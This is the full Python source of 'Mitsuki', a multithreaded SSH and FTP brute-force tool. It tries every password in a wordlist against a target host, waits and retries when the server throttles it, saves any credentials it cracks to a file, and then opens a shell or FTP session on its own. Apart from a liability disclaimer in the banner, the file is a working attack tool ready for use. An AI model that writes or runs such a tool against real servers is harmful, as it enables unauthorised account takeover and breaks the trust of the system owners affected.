import paramiko
import socket
import logging
import argparse
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess
import os
import threading
import time
import ftplib

logging.basicConfig(filename="bruteforce.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
stop_event = threading.Event()
password_found = False

def is_service_open(hostname, username, password, service):
    if service == 'ssh':
        return is_ssh_open(hostname, username, password)
    elif service == 'ftp':
        return is_ftp_open(hostname, username, password)
    else:
        logging.error("Invalid service specified.")
        return False

def is_ssh_open(hostname, username, password):
    if stop_event.is_set():
        return False
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        logging.error(f"Host: {hostname} is unreachable, timed out.")
        print(colored(f"[!] Host: {hostname} is unreachable, timed out.", "red"))
        return False
    except paramiko.AuthenticationException:
        logging.warning(f"Invalid SSH credentials for {username}:{password}")
        return False
    except paramiko.SSHException as e:
        if "Error reading SSH protocol banner" in str(e):
            logging.warning("Quota exceeded, retrying with delay...")
            print(colored("[*] Quota exceeded, retrying with delay...", "blue"))
            time.sleep(60)
            return is_ssh_open(hostname, username, password)
        else:
            logging.error(f"SSHException: {str(e)}")
            print(colored(f"[!] SSHException: {str(e)}", "red"))
            return False
    else:
        logging.info(f"Found valid SSH combo: {username}@{hostname}:{password}")
        print(colored("[+] Valid SSH Combination Found:", "green") + f"\nHostName: {colored(hostname, 'green')}\tUsername: {colored(username, 'green')}\tPassword: {colored(password, 'green')}")
        global password_found
        password_found = True
        return True
    finally:
        client.close()

def is_ftp_open(hostname, username, password):
    if stop_event.is_set():
        return False
    ftp = ftplib.FTP()
    try:
        ftp.connect(hostname)
        ftp.login(username, password)
    except socket.timeout:
        logging.error(f"Host: {hostname} is unreachable, timed out.")
        print(colored(f"[!] Host: {hostname} is unreachable, timed out.", "red"))
        return False
    except ftplib.error_perm:
        logging.warning(f"Invalid FTP credentials for {username}:{password}")
        return False
    except ftplib.error_reply as e:
        logging.error(f"FTP Error: {str(e)}")
        print(colored(f"[!] FTP Error: {str(e)}", "red"))
        return False
    else:
        logging.info(f"Found valid FTP combo: {username}@{hostname}:{password}")
        print(colored("[+] Valid FTP Combination Found:", "green") + f"\nHostName: {colored(hostname, 'green')}\tUsername: {colored(username, 'green')}\tPassword: {colored(password, 'green')}")
        global password_found
        password_found = True
        return True
    finally:
        ftp.quit()

def auto_connect(hostname, username, password, service):
    if service == 'ssh':
        command = f"sshpass -p {password} ssh {username}@{hostname}"
    elif service == 'ftp':
        command = f"lftp ftp://{username}:{password}@{hostname}"
    else:
        logging.error("Invalid service specified.")
        return

    try:
        if os.name == 'nt':
            subprocess.run(['start', 'cmd', '/k', command], shell=True)
        elif subprocess.run(['which', 'gnome-terminal'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            subprocess.run(['gnome-terminal', '--', 'bash', '-c', command])
        elif subprocess.run(['which', 'xterm'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            subprocess.run(['xterm', '-e', command])
        else:
            print(colored(f"[!] No graphical terminal emulator found. Running command in the current terminal.", "yellow"))
            subprocess.run(['bash', '-c', command])
    except Exception as e:
        logging.error(f"Error auto-connecting to {hostname}: {e}")
        print(colored(f"[!] Error auto-connecting to {hostname}: {e}", "red"))

def try_password(hostname, username, password, service):
    if stop_event.is_set():
        return False
    if is_service_open(hostname, username, password, service):
        if service == 'ssh':
            with open("ssh_credentials.txt", "a") as creds_file:
                creds_file.write(f"- {username}@{hostname}: {password}\n")
        elif service == 'ftp':
            with open("ftp_credentials.txt", "a") as creds_file:
                creds_file.write(f"- {username}@{hostname}: {password}\n")
        stop_event.set()
        return True
    return False

def display_loading_and_warning():
    banner = """
   _____  .__  __                __   .__ 
  /     \ |__|/  |_  ________ __|  | _|__|
 /  \ /  \|  \   __\/  ___/  |  \  |/ /  |
/    Y    \  ||  |  \___ \|  |  /    <|  |
\____|__  /__||__| /____  >____/|__|_ \__|
        \/              \/           \/   
                            Veilwr4ith
    """
    warning_message = """
[!] WARNING: NEVER USE THIS TOOL FOR ILLEGAL PURPOSES. THE AUTHOR OF THIS CODE WILL NOT BE HELD LIABLE FOR ANY MISUSE OR DAMAGE CAUSED BY ITS USE.
    """
    print(colored(banner, "magenta"))
    print(colored(warning_message, "red"))
    print(colored("[*] Processing", "yellow"), end="", flush=True)
    for _ in range(5):
        print(colored(".", "yellow"), end="", flush=True)
        time.sleep(5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mitsuki: SSH and FTP Bruteforce Tool")
    parser.add_argument("host", help="Hostname or IP Address of SSH/FTP Server.")
    parser.add_argument("-P", "--passlist", required=True, help="File that contains password list.")
    parser.add_argument("-u", "--user", required=True, help="Username for SSH/FTP.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use.")
    parser.add_argument("--protocol", choices=['ssh', 'ftp'], required=True, help="Protocol to bruteforce (ssh or ftp).")
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    num_threads = args.threads
    protocol = args.protocol.lower()
    display_loading_and_warning()
    with open(passlist, 'r') as f:
        passwords = f.read().splitlines()
    total_passwords = len(passwords)
    print(colored(f"\n[*] Total passwords in the wordlist: {total_passwords}", "yellow"))
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_password = {executor.submit(try_password, host, user, password, protocol): password for password in passwords}
        for future in as_completed(future_to_password):
            password = future_to_password[future]
            try:
                if future.result():
                    auto_connect(host, user, password, protocol)
                    break
            except Exception as e:
                logging.error(f"Error with password {password}: {e}")
                print(colored(f"[!] Error with password {password}: {e}", "red"))
    if not password_found:
        print(colored("[!] Password not found in the wordlist.", "yellow"))
    else:
        print(colored("[+] Session Closed! SSH BruteForce Completed!", "green"))

    logging.info("Bruteforce attack completed.")

